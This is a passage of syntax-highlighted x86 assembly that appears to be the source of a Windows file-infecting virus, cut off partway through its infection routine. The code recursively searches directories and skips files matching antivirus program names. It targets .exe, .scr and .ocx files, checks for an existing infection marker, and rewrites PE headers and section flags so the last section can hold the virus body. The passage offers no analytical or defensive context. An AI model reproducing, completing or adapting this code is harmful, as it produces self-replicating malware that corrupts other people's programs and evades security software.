             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">FindFirstFileA</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">RS_Exit</span><span class="sc0">

</span><span class="sc5">RS_00</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc5">SearchHandle</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">RS_01</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">test</span><span class="sc0">         </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">10</span><span class="sc0">         </span><span class="sc1">; dir ?</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">FileTest</span><span class="sc0">

</span><span class="sc5">RS_Directory</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2C</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">RS_Next</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2C</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">CurrentDirEnd</span><span class="sc0">

</span><span class="sc5">RSD_00</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">movsb</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">RSD_00</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc0">             </span><span class="sc6">stosb</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">FileSearch</span><span class="sc0">

</span><span class="sc5">RS_Next</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">Buffer2</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">SearchHandle</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">FindNextFileA</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">RS_01</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">SearchHandle</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">FindClose</span><span class="sc0">

</span><span class="sc5">RS_Exit</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">FileTest</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2C</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">20202020</span><span class="sc0">
             </span><span class="sc6">xor</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">61F81F61</span><span class="sc0">

             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">SkipNames</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; check av names</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0C</span><span class="sc0">

</span><span class="sc5">FT_00</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">lodsd</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">FT_Exit</span><span class="sc0">

             </span><span class="sc6">loop</span><span class="sc0">         </span><span class="sc5">FT_00</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2C</span><span class="sc0">

</span><span class="sc5">FT_01</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">lodsb</span><span class="sc0">
             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">FT_01</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; check extent</span><span class="sc0">
             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20202020</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">' xco'</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">FT_02</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">' rcs'</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">FT_02</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">' exe'</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">FT_Exit</span><span class="sc0">

</span><span class="sc5">FT_02</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; minimum file size</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2000</span><span class="sc0">
             </span><span class="sc6">jc</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">FT_Exit</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">                     </span><span class="sc1">; self-infection test</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">FT_Exit</span><span class="sc0">

             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Buffer1</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; get complete file name</span><span class="sc0">
             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">Buffer3</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; with path</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edi</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">CurrentDirEnd</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">repz</span><span class="sc0">         </span><span class="sc6">movsb</span><span class="sc0">

             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Buffer2</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2C</span><span class="sc0">

</span><span class="sc5">FT_03</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">movsb</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">FT_03</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">InfectFile</span><span class="sc0">

</span><span class="sc5">FT_Exit</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc5">RS_Next</span><span class="sc0">


</span><span class="sc5">FileSearch</span><span class="sc0">           </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; -----------------------   File Infection Routine   ---------------------- ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">


</span><span class="sc5">InfectFile</span><span class="sc0">                </span><span class="sc9">PROC</span><span class="sc0">         </span><span class="sc10">PASCAL</span><span class="sc0">       </span><span class="sc10">NEAR</span><span class="sc0">


</span><span class="sc5">ARG</span><span class="sc0">          </span><span class="sc5">i_Filename</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">

</span><span class="sc9">LOCAL</span><span class="sc0">        </span><span class="sc5">i_FileHandle</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \
             </span><span class="sc5">i_FileSize</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \
             </span><span class="sc5">i_BytesRead</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \
             </span><span class="sc5">i_VirusOffset</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \
             </span><span class="sc5">i_MapHandle</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \
             </span><span class="sc5">i_HostDep32</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \
             </span><span class="sc5">i_EP_Offset</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">


</span><span class="sc10">USES</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">


             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">i_Filename</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">03</span><span class="sc0">           </span><span class="sc1">; open existing</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">OpenFile</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc5">IN_Exit</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc5">i_FileHandle</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetFileSize</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc5">i_FileSize</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">      

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">                     </span><span class="sc1">; re-test if not already</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc5">IN_Exit</span><span class="sc0">                   </span><span class="sc1">; infected</span><span class="sc0">

             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">Buffer3</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">i_BytesRead</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">2000</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">i_FileHandle</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">ReadFile</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">5A4Dh</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc5">IN_CloseFile</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">],</span><span class="sc2">0040</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc5">IN_CloseFile</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3C</span><span class="sc4">],</span><span class="sc2">1C00</span><span class="sc0">   </span><span class="sc1">; Check DOS header size</span><span class="sc0">
             </span><span class="sc6">ja</span><span class="sc0">           </span><span class="sc5">IN_CloseFile</span><span class="sc0">

             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3C</span><span class="sc4">]</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00004550</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc5">IN_CloseFile</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5C</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">     </span><span class="sc1">; Subsystem == GUI</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc5">IN_CloseFile</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">18</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; esi -&gt; 1st section</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; now search for the</span><span class="sc0">
                                                    </span><span class="sc1">; section which contains</span><span class="sc0">
</span><span class="sc5">IN_00</span><span class="sc4">:</span><span class="sc0">                                              </span><span class="sc1">; the EP</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0C</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08</span><span class="sc4">]</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">jc</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IN_01</span><span class="sc0">

             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IN_00</span><span class="sc0">

</span><span class="sc5">IN_01</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0C</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc5">i_EP_Offset</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">],</span><span class="sc2">80000000</span><span class="sc0">       </span><span class="sc1">; make it writeable</span><span class="sc0">

             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc0">                          
             </span><span class="sc6">xor</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">06</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">dec</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc0">
             </span><span class="sc6">mul</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; esi -&gt; last section</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">                     </span><span class="sc1">; uninitialized ?</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc5">IN_CloseFile</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8C000000</span><span class="sc0">         </span><span class="sc1">; writeable, not cached/paged</span><span class="sc0">
             </span><span class="sc6">and</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">12000000</span><span class="sc0">     </span><span class="sc1">; not shared/discardable</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">i_FileSize</span><span class="sc0">            </span><span class="sc1">; don't infect SFX</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">clc</span><span class="sc0">
             </span><span class="sc6">shr</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">jc</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IN_02</span><span class="sc0">

             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">jnc</span><span class="sc0">          </span><span class="sc5">IN_CloseFile</span><span class="sc0">

</span><span class="sc5">IN_02</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">; calculate new last section size</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08</span><span class="sc4">]</span><span class="sc0">
                                               
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc4">]</span><span class="sc0">        
             </span><span class="sc6">jc</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IN_03</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">ja</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IN_03</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">IN_03</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">test</span><span class="sc0">         </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">00000FFF</span><span class="sc0">              </span><span class="sc1">; align on 1000h</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IN_04</span><span class="sc0">

             </span><span class="sc6">and</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0FFFFF000</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1000</span><span class="sc0">

</span><span class="sc5">IN_04</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0C</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Virt_VSize</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; new image size</span><span class="sc0">

             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VStart</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">08</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc5">i_HostDep32</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                   
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Virt_VSize</span><span class="sc0">            </span><span class="sc1">; increase virtual size</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                   
